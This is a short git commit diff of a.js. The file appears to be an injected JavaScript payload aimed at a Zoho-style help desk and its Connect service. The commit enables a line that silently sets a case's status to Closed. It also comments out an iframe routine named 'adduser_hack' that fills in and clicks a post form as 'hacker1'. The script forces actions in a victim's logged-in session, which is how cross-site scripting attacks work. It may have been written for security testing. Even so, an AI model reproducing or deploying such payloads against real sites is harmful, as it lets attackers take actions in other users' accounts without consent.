a064b9cc3d94de868d242ca22e302f1d9a4d4bf7
Nandha30 <mail.nandha30@gmail.com>
2016-10-04 12:31:34 +0530

    Update a.js
    hjks

--- a.js
+++ a.js
@@ -1,5 +1,5 @@
 //Closing a Ticket...
-//var statusVal = getClosedLabel();assignValue('Cases','6b28c32dddd03edf3e9898aa0dd1498de612657a51fd5fbe',encodeURIComponent(statusVal),'Status');
+var statusVal = getClosedLabel();assignValue('Cases','51123033fe97b2f865bcc59236aefd0f',encodeURIComponent(statusVal),'Status');
 
 //Adding an agent...
 // var iframe = jQuery("<iframe></iframe>");
@@ -16,13 +16,13 @@
 // }
 
 //Adding post in Connect...
-var iframe = jquery("<iframe></iframe>");
-jQuery(iframe).attr("src","&frameorigin=https://connect.localzoho.com");
-jQuery(iframe).attr("onload","adduser_hack()");
+// var iframe = jquery("<iframe></iframe>");
+// jQuery(iframe).attr("src","&frameorigin=https://connect.localzoho.com");
+// jQuery(iframe).attr("onload","adduser_hack()");
 
-jQuery("body").append(iframe);
+// jQuery("body").append(iframe);
 
-function adduser_hack(){
-jQuery(iframe).contents().find('#newStreamContentarea').val("hacker1");
-jquery(iframe).contents().find('#addstreamButton').click();
-}
+// function adduser_hack(){
+// jQuery(iframe).contents().find('#newStreamContentarea').val("hacker1");
+// jquery(iframe).contents().find('#addstreamButton').click();
+// }
